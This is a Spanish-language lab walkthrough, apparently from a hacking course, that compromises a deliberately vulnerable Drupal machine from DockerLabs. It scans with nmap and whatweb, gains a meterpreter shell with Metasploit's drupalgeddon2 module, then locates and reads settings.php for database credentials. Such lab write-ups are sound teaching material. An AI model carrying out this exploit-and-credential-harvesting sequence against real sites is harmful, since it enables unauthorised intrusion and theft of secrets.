# Hacking en Entornos Drupal – PARTE 2

Maquinas que vamos a utilizar **Kali Linux y FindYourStyle** [DockerLabs](https://dockerlabs.es/)

Descargar en ele escritorio de Kali. Descomprimimos el archivo y en un terminal escribimos el siguiente comando para desplegar la maquina en Docker.

```bash
sudo bash auto_deploy.sh findyourstyle.tar
```

![image.png](./imagenes/image%2047.png)

```bash
nmap -p- -sS -sV -sC --open -min-rate=5000 -n -vvv -Pn 172.17.0.2 
```

![image.png](./imagenes/image%2048.png)

- Nos vamos en el navegador y ponemos la IP para ver el puerto 80 en el navegador web
    
    ![image.png](./imagenes/image%2049.png)
    

- Usamos la **herramienta whatweb** para ver que tecnologías utiliza la web.
    
    ```bash
    whatweb http://172.17.0.2/  
    ```
    
    ![image.png](./imagenes/image%2050.png)
    

- Lanzamos el Metasploit
    
    ![image.png](./imagenes/image%2051.png)
    
    `search drupal 8`
    
    ![image.png](./imagenes/image%2052.png)
    

`use exploit/unix/webapp/drupal_drupalgeddon2`

![image.png](./imagenes/image%2053.png)

`show options`

![image.png](./imagenes/image%2054.png)

Completamos los datos que nos falten.

`set RHOSTS 172.17.0.2`

`show options`

![image.png](./imagenes/image%2055.png)

`run`

![image.png](./imagenes/image%2056.png)

Ya tenemos una sesión de meterpreter

- Lanzamos una sesion de shell
    
    `shell`
    
    ![image.png](./imagenes/image%2057.png)
    
- Vamos a buscar el archivo **settings.php.**
    
    <aside>
    👉
    
    El archivo **settings.php** en Drupal **es crucial** para la configuración del sitio. Se encuentra en la carpeta `sites/default` y almacena información clave, como la conexión a la base de datos, el nombre de la base de datos, el usuario y la contraseña
    
    </aside>
    
    `find / -name settings.php 2>/dev/null`
    
    ![image.png](./imagenes/image%2058.png)
    
    <aside>
    💡
    
    `find /`: Busca en todo el sistema desde la raíz (`/`).
    
    `name settings.php`: Filtra la búsqueda para encontrar archivos que coincidan exactamente con el nombre `settings.php`.
    
    `2>/dev/null`: Redirige los mensajes de error generados por la búsqueda (por ejemplo, por falta de permisos) al vacío (`/dev/null`), evitando que aparezcan en la salida.
    
    </aside>
    
- Vamos a ver el contenido del archivo **settings.php**
    
    `cat /var/www/html/sites/default/settings.php`
    
    ![image.png](./imagenes/image%2059.png)
    
    Aquí intentaremos encontrar contraseñas, usuarios , etc…
    
    ![image.png](./imagenes/image%2060.png)
    
    ![image.png](./imagenes/image%2061.png)